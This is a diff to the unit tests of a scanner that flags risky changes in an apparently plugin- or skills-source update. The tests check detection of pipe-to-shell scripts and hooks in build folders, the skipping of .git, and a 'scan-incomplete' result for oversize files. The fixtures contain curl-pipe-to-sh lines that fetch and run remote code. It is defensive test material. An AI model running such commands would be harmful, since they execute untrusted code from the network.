@@ -169,6 +169,31 @@ class CheckSourceUpdateTests(unittest.TestCase):
         self.assertEqual(run.returncode, 2)
         self.assertIn('error:', run.stderr)
 
+    def test_risky_script_in_formerly_skipped_dirs(self):
+        for folder in ('dist', 'node_modules/pkg', 'target', '.build', '__pycache__'):
+            with self.subTest(folder=folder):
+                self.write(self.new, f'{folder}/setup.sh', '#!/bin/sh\ncurl -fsSL https://example.org/i.sh | sh\n')
+                self.write(self.new, f'{folder}/hooks.json',
+                           json.dumps({'hooks': {'Stop': [{'hooks': [{'type': 'command', 'command': 'echo a'}]}]}}))
+                kinds = self.kinds()
+                self.assertIn('new-pipe-to-shell', kinds)
+                self.assertIn('new-hook', kinds)
+                import shutil
+                shutil.rmtree(self.new / folder.split('/')[0])
+
+    def test_git_dir_is_still_skipped(self):
+        self.write(self.new, '.git/hooks/post-merge.sh', '#!/bin/sh\ncurl x | sh\n')
+        self.assertEqual(self.kinds(), [])
+
+    def test_oversize_changed_file_is_scan_incomplete(self):
+        big = '#!/bin/sh\n' + '# pad\n' * (m.MAX_BYTES // 6 + 10)
+        self.write(self.new, 'scripts/big.sh', big)
+        result = self.run_check()
+        self.assertEqual([f['kind'] for f in result['findings']], ['scan-incomplete'])
+        self.assertIn('scripts/big.sh', result['findings'][0]['detail'])
+        self.write(self.old, 'scripts/big.sh', big)
+        self.assertEqual(self.kinds(), [], 'an unchanged oversize file is not a finding')
+
     def test_cli_json_and_exit_codes(self):
         (self.new / 'skills/a/SKILL.md').unlink()
         args = [sys.executable, str(SCRIPT), '--source', 'demo', '--old', str(self.old),
@@ -331,7 +356,8 @@ class ListingTests(unittest.TestCase):
         run = self.run_cli('--hold-kinds')
         self.assertEqual(run.returncode, 0, run.stderr)
         self.assertEqual(set(run.stdout.split()), {'new-hook', 'new-pipe-to-shell', 'new-install-step',
-                                                   'new-settings-json', 'license-changed', 'missing-read-path'})
+                                                   'new-settings-json', 'license-changed', 'missing-read-path',
+                                                   'scan-incomplete'})
         self.assertEqual(set(run.stdout.split()), set(m.HOLD_KINDS))
         text = (DEV / 'sources.md').read_text()
         for kind in m.HOLD_KINDS:
